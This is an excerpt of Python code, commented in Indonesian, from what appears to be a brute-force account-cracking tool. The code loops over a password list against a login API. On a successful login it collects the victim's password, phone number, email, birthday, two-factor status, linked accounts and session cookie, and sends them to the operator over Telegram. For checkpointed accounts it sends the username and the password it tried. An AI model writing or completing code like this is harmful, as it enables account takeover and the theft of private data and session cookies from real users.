  ...
  def ApiThreads(self, users, password):
    ...
    try:
        for pwb in password:
            ...
            params_ = f'params=...&bloks_versioning_id=...'  # Disingkat biar fokus
            ...
            if 'logged_in_user' in str(_respon.text.replace('\\\','')):
                ...
                # KIRIM TELEGRAM - LOGIN SUKSES
                pesan_ok = f"""
✅ <b>Success Login</b>
• Username : <code>{info_username}</code>
• Password : <code>{self.PWX}</code>
• Nomor HP : {info_nomor_hp}
• Email    : {info_email}
• Birthday : {info_birthday}
• A2F      : {self.cex if self.aut else 'Tidak Aktif'}
• Followers/Following : {info_followers}/{info_following}
• Facebook : {akunfb}
• Useragent: <code>{dikaa}</code>
• Cookie   : <code>{cookie}</code>
                """
                self.kirim_telegram(pesan_ok)
                break
                ...
                # KIRIM TELEGRAM - CHECKPOINT
                pesan_cp = f"""
⚠️ <b>Checkpoint Detected</b>
• Username : <code>{users}</code>
• Password : <code>{pwb}</code>
• Data Profile : {followers}/{following}/{postingan}
• Useragent    : <code>{dikaa}</code>
                """
                self.kirim_telegram(pesan_cp)
                break
